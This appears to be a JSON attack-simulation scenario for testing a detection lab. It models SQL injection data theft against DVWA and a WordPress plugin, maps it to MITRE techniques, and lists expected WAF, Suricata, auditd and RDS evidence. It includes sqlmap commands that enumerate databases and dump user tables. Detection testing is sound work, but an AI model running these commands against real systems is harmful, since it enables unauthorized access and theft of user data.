{
  "scenario_id": "S3",
  "name": "sqli_data_exfil",
  "description": "SQL Injection으로 DB 데이터 유출",
  "category": "exfiltration",
  "severity": "critical",
  "mitre_tactics": ["TA0001-Initial Access", "TA0009-Collection", "TA0010-Exfiltration"],
  "mitre_techniques": ["T1190-Exploit Public-Facing Application", "T1005-Data from Local System", "T1048-Exfiltration Over Alternative Protocol"],
  "prerequisites": ["S2 계정 탈취 또는 취약 엔드포인트 확인", "DVWA 설치 완료"],
  "actor": "외부 공격자 (탈취 계정 또는 직접 공격)",
  "steps": [
    {
      "step": 1,
      "action": "DVWA SQLi (Low → Medium)",
      "command": "sqlmap -u 'http://APP_IP:8081/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='PHPSESSID=xxx;security=low' --dbs --batch",
      "expected": "DB 목록 추출, Suricata SID 9000001"
    },
    {
      "step": 2,
      "action": "WordPress 플러그인 SQLi",
      "command": "sqlmap -u 'https://ALB_DNS/?vulnerable_param=1' --tables --batch --level=3",
      "expected": "WAF SQLi Count, Suricata SID 9000001"
    },
    {
      "step": 3,
      "action": "데이터 덤프",
      "command": "sqlmap -u 'http://APP_IP:8081/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='...' -D dvwa -T users --dump --batch",
      "expected": "사용자 테이블 덤프 성공"
    },
    {
      "step": 4,
      "action": "대량 SELECT 쿼리 (RDS slow query 트리거)",
      "command": "sqlmap ... --sql-query='SELECT * FROM wp_users' --batch",
      "expected": "RDS slow query 로그, 대량 데이터 전송"
    }
  ],
  "expected_evidence": {
    "waf": ["AWSManagedRulesSQLiRuleSet 다수 Count/Block"],
    "suricata": ["SID 9000001 (SQL injection pattern)"],
    "nginx": ["비정상 쿼리스트링 포함 요청"],
    "apache": ["500 에러 또는 비정상 응답 크기"],
    "wordpress_audit": [],
    "elastic_defend": ["mysql 프로세스 비정상 활동"],
    "auditd": ["mysql execve 이벤트"],
    "flow_logs": ["APP→RDS 대량 트래픽"],
    "cloudtrail": [],
    "rds": ["slow_query_log: 대량 SELECT", "error_log: 의심 쿼리"]
  },
  "detection_rules": ["suricata-9000001", "waf-sqli-block", "elastic-sqli-detected", "rds-unusual-query-volume"],
  "success_criteria": "SQLi 탐지 → critical alert → 자동 증거 수집 파이프라인 트리거"
}
